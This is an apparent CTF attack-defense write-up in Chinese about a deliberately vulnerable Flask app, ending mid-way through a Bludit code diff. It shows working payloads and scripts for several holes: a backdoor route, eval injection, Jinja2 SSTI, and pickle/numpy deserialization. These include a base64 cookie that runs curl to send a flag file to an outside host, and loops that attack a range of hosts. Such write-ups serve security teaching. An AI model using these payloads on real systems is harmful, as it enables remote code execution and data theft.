bytes(get_cookie(), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    value = base64.b64encode(cookies)</span><br><span class="line">    resp.set_cookie(<span class="string">"username"</span>, value=value)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/Archive/&lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Archive</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    <span class="keyword">if</span> id&gt;len(Archives):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'文章ID不存在！'</span>, status=<span class="string">'失败'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'Archive.html'</span>,Archive = Archives[id])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/message',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.get(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,留言成功'</span>%username)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello',methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base64.b64decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja2.from_string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    is_value = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, msg=data,is_value=is_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getvdot',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvdot</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        result = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>,msg=result,status=<span class="string">'向量点积'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/robots.txt',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="string">'5000'</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#我应该没在这上面动过</span></span><br></pre></td></tr></table></figure><p>这题的洞比较多也很明显，开场就打飞了，在这上面翻车的，也在这上面薅了不少分……</p><h4 id="1-内置后门"><a href="#1-内置后门" class="headerlink" title="1.内置后门"></a>1.内置后门</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/robots.txt'</span>,methods=[<span class="string">'GET'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=True)</span><br></pre></td></tr></table></figure><p>直接读flag文件到robots.txt文件了，所以直接访问/robots.txt就拿到flag了。</p><h4 id="2-代码拼接"><a href="#2-代码拼接" class="headerlink" title="2.代码拼接"></a>2.代码拼接</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span></span>(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span>:</span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span></span><br><span class="line"><span class="class">    <span class="title">print</span>(<span class="params">retstr</span>)</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">eval</span>(<span class="params">retstr</span>)</span></span><br></pre></td></tr></table></figure><p>set_str在/message处进行了调用，其中变量str取值msg，只进行了简单的处理</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(msg)&gt;<span class="number">27</span>:</span><br><span class="line">    <span class="literal">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">retstr = set_str(type,msg)</span><br></pre></td></tr></table></figure><p>所以可以任意拼接代码，给msg赋值为</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+open('</span>/<span class="built_in">flag</span><span class="string">').read()+'</span></span><br></pre></td></tr></table></figure><p>触发eval，直接read读取flag</p><h4 id="3-SSTI"><a href="#3-SSTI" class="headerlink" title="3.SSTI"></a>3.SSTI</h4><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/hello'</span>,methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def hello():</span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base<span class="number">64</span>.b<span class="number">64</span>decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja<span class="number">2</span>.from<span class="number">_</span>string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    <span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span> = False</span><br><span class="line">    <span class="keyword">return</span> render<span class="number">_</span>template(<span class="string">'hello.html'</span>, msg=data,<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>=<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>)</span><br></pre></td></tr></table></figure><p>数据接口为cookie中的username，取值后进行了一次base64解码，通过Jinja2.from_string(‘****’).render()来触发SSTI，不会的阔以参考：<a href="https://www.exploit-db.com/exploits/46386，我们在打的时候没回显，所以用的是反弹flag的方式，弹到本地然后再交，贴下payload" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46386，我们在打的时候没回显，所以用的是反弹flag的方式，弹到本地然后再交，贴下payload</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(3,21):</span><br><span class="line">try:</span><br><span class="line">#payload = <span class="string">"system('cat /flag');"</span></span><br><span class="line">Url =<span class="string">"http://10.0.%s.4:5000/hello"</span>% i </span><br><span class="line">cookie = &#123;<span class="string">'username'</span>:<span class="string">'e3sgKCkuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzkzXS5fX2luaXRfXy5fX2dsb2JhbHNfX1sic3lzIl0ubW9kdWxlc1sib3MiXS5zeXN0ZW0oJ2N1cmwgImh0dHA6Ly8xMC4xMC4yLjIwNzozMDAxL2ZsYWciIC1kICIkKGNhdCAvZj8/PykiJykgfX0='</span>&#125;</span><br><span class="line">#<span class="builtin-name">print</span> Url</span><br><span class="line"><span class="built_in">IP </span>= <span class="string">'10.0.%s.4'</span>% i</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">'Target:'</span> + IP</span><br><span class="line"><span class="attribute">result</span>=requests.post(url=Url,cookies = cookie,<span class="attribute">timeout</span>=3)</span><br><span class="line"><span class="string">''</span><span class="string">'flag=result.text</span></span><br><span class="line"><span class="string">mat = re.compile(".*([0-9a-zA-Z]&#123;20&#125;).*")</span></span><br><span class="line"><span class="string">flag = mat.findall(flag)[0]</span></span><br><span class="line"><span class="string">print flag</span></span><br><span class="line"><span class="string">submit_token(flag)'</span><span class="string">''</span></span><br><span class="line">#submit_cookie(IP,flag)</span><br><span class="line">except:</span><br><span class="line">sleep(0.1)</span><br><span class="line">sleep(200)</span><br></pre></td></tr></table></figure><p>本地起个服务接收并提交flag就行了</p><h4 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4.反序列化"></a>4.反序列化</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/message'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def message():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.<span class="keyword">get</span>(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,留言成功'</span>%username)</span><br></pre></td></tr></table></figure><p>一个pickle的反序列化，没啥东西，直接贴下payload</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base<span class="number">64</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> exp(<span class="keyword">object</span>):</span><br><span class="line">    def <span class="number">__</span>reduce<span class="number">__</span>(self):</span><br><span class="line">        s = <span class="string">"""curl -F token=mEs8j1Dl -F flag=$(cat /flag) http://10.10.0.2/api/flag/submit"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line">post<span class="number">_</span>data = &#123;<span class="string">'msg'</span>:<span class="string">''</span>,<span class="string">'type'</span>:<span class="string">''</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">'user'</span>,base<span class="number">64</span>.b<span class="number">64</span>encode(s).decode()&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="number">__n</span>ame<span class="number">__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">        url = http:<span class="comment">//10.0.%s.4:5000/message"% i</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url = url, cookies = cookie,data = post<span class="number">_</span>data)</span><br><span class="line">        except:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>反序列化第二个点是numpy（我看的时候看版本挺新的，由于其触发主要还是pickle，所以这个点还是能够触发反序列化）</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/getvdot'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def getvdot():</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">GET</span>':</span></span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">result</span> = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(<span class="keyword">result</span>)</span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>,msg=<span class="keyword">result</span>,status=<span class="string">'向量点积'</span>)</span><br></pre></td></tr></table></figure><p>参考<a href="https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        s = <span class="string">"""ls"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,) </span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    poc = pickle.dumps(e)</span><br><span class="line">    print(poc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.pkl'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(e, f)</span><br><span class="line"></span><br><span class="line">numpy.load(<span class="string">'1.pkl'</span>);</span><br></pre></td></tr></table></figure><p>把生成的1.pkl读出来直接赋值给matrix1，matrix2打就行了（感谢<strong>f1sh</strong>大师傅的指导），本地没环境，就不贴图了~</p><h2 id="0x02-OZero"><a href="#0x02-OZero" class="headerlink" title="0x02 OZero"></a>0x02 OZero</h2><p>这里先贴下场上的时候z3r0yu师傅对比后的分析日志，源码下载地址：<a href="https://github.com/bludit/bludit/releases" target="_blank" rel="noopener">https://github.com/bludit/bludit/releases</a></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">被修改的几个点</span><br><span class="line"><span class="number">1.</span> bl-kernel/site.class.php</span><br><span class="line"><span class="string">'dribbble'</span>=&gt;<span class="string">''</span>,</span><br><span class="line"><span class="string">'customFields'</span>=&gt;<span class="string">'&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> bl-kernel/pagex.class.php</span><br><span class="line"><span class="comment">// Returns the value from the field, false if the fields doesn't exists</span></span><br><span class="line"><span class="comment">// If you set the $option as TRUE, the function returns an array with all the values of the field</span></span><br><span class="line">public function custom(<span class="symbol">$</span>field, <span class="symbol">$</span><span class="keyword">options</span>=false)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">            return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field];</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field][<span class="string">'value'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> bl-kernel/pages.class.php</span><br><span class="line">elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert custom fields to all the pages in the database</span></span><br><span class="line"><span class="comment">// The structure for the custom fields need to be a valid JSON format</span></span><br><span class="line"><span class="comment">// The custom fields are incremental, this means the custom fields are never deleted</span></span><br><span class="line"><span class="comment">// The pages only store the value of the custom field, the structure of the custom fields are in the database site.php</span></span><br><span class="line">public function setCustomFields(<span class="symbol">$</span>fields)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="symbol">$</span>customFields = json_decode(<span class="symbol">$</span>fields, true);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach (<span class="symbol">$</span>this-&gt;db as <span class="symbol">$</span>pageKey=&gt;<span class="symbol">$</span>pageFields) &#123;</span><br><span class="line">        foreach (<span class="symbol">$</span>customFields as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValues) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isset(<span class="symbol">$</span>pageFields[<span class="string">'custom'</span>][<span class="symbol">$</span>customField])) &#123;</span><br><span class="line">                <span class="symbol">$</span>defaultValue = <span class="string">''</span>;</span><br><span class="line">                <span class="keyword">if</span> (isset(<span class="symbol">$</span>customValues[<span class="string">'default'</span>])) &#123;</span><br><span class="line">                    <span class="symbol">$</span>defaultValue = <span class="symbol">$</span>customValues[<span class="string">'default'</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="symbol">$</span>this-&gt;db[<span class="symbol">$</span>pageKey][<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>defaultValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span 